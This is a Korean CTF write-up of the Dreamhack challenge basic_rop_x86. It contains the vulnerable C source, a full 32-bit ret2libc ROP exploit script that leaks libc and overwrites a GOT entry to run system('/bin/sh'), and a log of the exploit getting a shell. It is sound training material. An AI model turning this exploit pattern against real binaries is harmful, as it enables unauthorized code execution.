@@ -1,0 +1,192 @@
+---
+title: "[Dreamhack] basic_rop_x86 문제 풀이"
+date: 2025-01-21
+tags: ["dreamhack", "system_hacking", "wargame"]
+draft: false
+summary: "요약: 오랜만에 32bit 바이너리다!!!!!"
+---
+
+# 문제 개요
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+
+int main(int argc, char *argv[]) {
+    char buf[0x40] = {};
+
+    initialize();
+
+    read(0, buf, 0x400);
+    write(1, buf, sizeof(buf));
+
+    return 0;
+}
+```
+
+코드는 위와 같이 되어있다. 보시다시피 저번이랑 코드가 같다 ㅋㅋ
+# 익스플로잇 코드 작성
+
+```python
+from pwn import *
+
+#p = process('./basic_rop_x86')
+p = remote('host1.dreamhack.games', 24346)
+elf = ELF('./basic_rop_x86')
+#libc = elf.libc
+libc = ELF('./libc.so.6')
+bss = elf.bss()
+
+pppr = 0x08048689
+write_plt = elf.plt['write']
+read_plt = elf.plt['read']
+read_got = elf.got['read']
+
+# chain 0. buffer overflowing
+payload = b'A'*0x48
+# chain 1. leaking read@got to using write@plt
+payload += p32(write_plt)
+payload += p32(pppr)
+payload += p32(1)
+payload += p32(read_got)
+payload += p32(40)
+# chain 2. writing '/bin/sh\x00' in bss
+payload += p32(read_plt)
+payload += p32(pppr)
+payload += p32(0)
+payload += p32(bss)
+payload += p32(40)
+# chain 3. got overwriting
+payload += p32(read_plt)
+payload += p32(pppr)
+payload += p32(0)
+payload += p32(read_got)
+payload += p32(40)
+# chain 4. exploit!!! [read('/bin/sh'); --> system('/bin/sh');]
+payload += p32(read_plt)
+payload += b'BBBB'
+payload += p32(bss)
+
+p.send(payload)
+
+p.recvuntil(b'A'*64)
+leak = u32(p.recv(4))
+base = leak - libc.symbols['read']
+sys = base + libc.symbols['system']
+print('read_leak: '+hex(leak))
+print('base: '+hex(base))
+print('system: '+hex(sys))
+print('bss: '+hex(bss))
+
+p.send(b'/bin/sh\x00')
+p.send(p64(sys))
+
+p.interactive()
+```
+
+오늘은 64bit 문제가 아니라서 함수 호출 인자 저장 방식이 좀 다르다.
+
+이걸 한번 한번 설명하겠다.
+## cdecl 32bit
+
+다들 SYSV fastcall 64bit 아키텍처에선 함수 호출 시 인자를 레지스터에 저장한다는 것을 알고 있을것이다.
+
+근데 cdecl 32bit 아키텍처는 이와 다르게 함수 호출 시 인자를 레지스터가 아닌 스택에 push 한 뒤에 pop하는 형식으로 사용한다.
+
+뭐 64bit 도 스택을 사용하긴 하나, 흔히 사용하진 않는다. 
+
+## 32bit rop 익스플로잇 코드 작성방법은?
+
+32bit의 경우엔 함수 호출 규약이 아예 달라서 그냥 익스코드도 아예 다르다.
+
+뭐 진행 방식과 시나리오는 비슷하나 체이닝 하는 방식이 다르다.
+
+예를 들어서 64bit 에선,
+```python
+payload += p64(p_rdi)
+payload += p64(1)
+payload += p64(p_rsi)
+payload += p64(read_got)
+payload += p64(16)
+payload += p64(write_plt)
+```
+와 같이 인자를 미리 다 셋팅한 뒤에 함수 주소를 넣게 되는데,
+
+32bit의 경우엔,
+```python
+payload += p32(write_plt)
+payload += p32(pppr)
+payload += p32(1)
+payload += p32(read_got)
+payload += p32(40)
+```
+와 같이 먼저 함수 주소를 넣고 pop을 통해 스택에 있는 쓰잘데기 없는? 것들을 정리하는 방식을 가지게 된다.
+
+이처럼 체이닝 하는 방법이 반대와 같은 느낌을 띈다.
+
+> 이러한 과정을 이해하고 지난번에 적었던 64bit 시나리오를 그대로 32bit 형식으로 refactoring을 진행했다.
+>
+> __본론으로 이제 익스를 해보자.__
+
+# 익스플로잇!!
+
+```bash
+zerocoke@1eeeb91477a2:~/dh/basic_rop_x86$ python3 ex.py
+[+] Opening connection to host1.dreamhack.games on port 24346: Done
+[*] '/home/zerocoke/dh/basic_rop_x86/basic_rop_x86'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+[*] '/home/zerocoke/dh/basic_rop_x86/libc.so.6'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+read_leak: 0xf7df54c0
+base: 0xf7ced000
+system: 0xf7d34cb0
+bss: 0x804a040
+[*] Switching to interactive mode
+PD\xd2\xf7\x10\x95\xdc\xf7&\x84\x04\x086\x84\x04\x08`\xe5\xd0\xf7\x80U\xdf\xf70\xff\xd5\xf7\x00\x00\x00\x00\x00\x00\x00\x00$                                                     l                                                                                        ls                                                                                       ls
+basic_rop_x86
+flag
+libc.so.6
+$ cat flag
+DH{...}
+$ exit
+[*] Got EOF while reading in interactive
+$ 
+$ 
+[*] Closed connection to host1.dreamhack.games port 24346
+[*] Got EOF while sending in interactive
+```
+# 느낀점 또는 발전한 점
+
+근래에 32비트 바이너리를 다룬적이 없어서 조금 해맸다.
+
+근데도 함수 호출 인자 방식과 순서 등을 알고 나니 수월하게 풀이를 진행한것 같다.
+
+꾸준히 적는것 같아서 행복하다 :) 계속 꾸준히 적어야겠다.
